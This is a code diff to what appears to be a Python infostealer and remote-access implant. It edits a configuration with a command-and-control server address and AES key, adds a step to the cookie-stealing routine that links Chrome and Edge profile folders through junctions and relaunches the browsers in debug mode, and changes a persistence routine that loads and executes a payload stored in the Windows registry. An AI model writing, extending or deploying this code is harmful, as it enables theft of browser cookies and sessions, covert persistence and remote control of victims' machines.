@@ -8,10 +8,10 @@ def install_module(module_name, pip_name=None):
     pip_name = pip_name or module_name
     try:
         subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name])
-        print(f"Successfully installed {{{{module_name}}}}")
+        print(f"Successfully installed {module_name}")
         return True
     except subprocess.CalledProcessError:
-        print(f"Failed to install {{{{module_name}}}}")
+        print(f"Failed to install {module_name}")
         return False
 
 # List of required modules with their pip names if different
@@ -44,7 +44,7 @@ for module, pip_name in required_modules:
         else:
             __import__(module.split('.')[0])
     except ImportError:
-        print(f"Module {{{{module}}}} not found. Attempting to install...")
+        print(f"Module {module} not found. Attempting to install...")
         if pip_name:
             install_module(module, pip_name)
         else:
@@ -89,7 +89,8 @@ try:
     
     print("All modules imported successfully!")
 except ImportError as e:
-    print(f"Failed to import module: {{{{e}}}}")
+    print(f"Failed to import module: {e}")
+    
     
 
 
@@ -99,7 +100,7 @@ except ImportError as e:
 # ======================
 class Config:
     def __init__(self):
-        self.C2_SERVER = "https://10.10.8.3"
+        self.C2_SERVER = "https://192.168.16.60"
         self.AES_KEY = b"32bytekey-ultra-secure-123456789"
         self.AES_IV = b"16byteiv-9876543"
         self.USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
@@ -108,9 +109,10 @@ class Config:
         self.MAX_UPLOAD_SIZE = 10 * 1024 * 1024
         self.DEBUG = True
         self.TAKE_SCREENSHOTS = False
-        self.SCREENSHOT_FREQUENCY = 10
+        self.SCREENSHOT_FREQUENCY = 30
         self.KILLDATE_ENABLED = False
         self.KILLDATE = "" if False else ""
+
 
 # ======================
 # Encryption
@@ -319,10 +321,50 @@ class CookieStealer:
             transformed.append(transformed_cookie)
         return transformed
 
+    def _create_junctions(self):
+        """Create junctions for Chrome and Edge user data directories"""
+        temp_dir = os.getenv('TEMP')
+        chrome_junction = os.path.join(temp_dir, 'g')
+        edge_junction = os.path.join(temp_dir, 'e')
+
+        # Remove existing junctions if they exist
+        for junction in [chrome_junction, edge_junction]:
+            if os.path.exists(junction):
+                try:
+                    if os.path.isdir(junction):
+                        subprocess.run(['cmd', '/c', 'rmdir', junction], check=True)
+                    else:
+                        os.remove(junction)
+                except Exception as e:
+                    self._log('error', f"Failed to remove existing junction {junction}: {str(e)}")
+
+        # Create junctions using mklink /j
+        try:
+            subprocess.check_call(f'mklink /j "{chrome_junction}" "{self.CHROME_USER_DATA_DIR}"', shell=True)
+            self._log('info', f"Created junction {chrome_junction} -> {self.CHROME_USER_DATA_DIR}")
+        except Exception as e:
+            self._log('error', f"Failed to create junction for Chrome: {str(e)}")
+
+        try:
+            subprocess.check_call(f'mklink /j "{edge_junction}" "{self.EDGE_USER_DATA_DIR}"', shell=True)
+            self._log('info', f"Created junction {edge_junction} -> {self.EDGE_USER_DATA_DIR}")
+        except Exception as e:
+            self._log('error', f"Failed to create junction for Edge: {str(e)}")
+
+        return chrome_junction, edge_junction
+
     def _start_browser_debug(self, browser_path, port, user_data_dir):
         """Start browser in debug mode"""
         try:
             self._kill_browser(os.path.basename(browser_path))
+
+            # Create junctions and use them if user_data_dir matches Chrome or Edge paths
+            chrome_junction, edge_junction = self._create_junctions()
+            if user_data_dir == self.CHROME_USER_DATA_DIR:
+                user_data_dir = chrome_junction
+            elif user_data_dir == self.EDGE_USER_DATA_DIR:
+                user_data_dir = edge_junction
+
             command = [
                 browser_path,
                 f'--remote-debugging-port={port}',
@@ -756,12 +798,8 @@ class Persistence:
                 'echo import sys',
                 'echo.',
                 'echo try:',
-                'echo     try:',
-                'echo         key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r\'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\VersionInfo\'^)',
-                'echo         value, regtype = winreg.QueryValueEx(key, \'lube\'^)',
-                'echo     except FileNotFoundError:',
-                'echo         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r\'Software\\Microsoft\\Accessibility\\Setup\'^)',
-                'echo         value, regtype = winreg.QueryValueEx(key, \'lube\'^)',
+                'echo     key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r\'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\VersionInfo\'^)',
+                'echo     value, regtype = winreg.QueryValueEx(key, \'lube\'^)',
                 'echo     script = value.decode(\'utf-8\'^) if regtype == winreg.REG_BINARY else value',
                 'echo     exec(script^)',
                 'echo except Exception as e:',
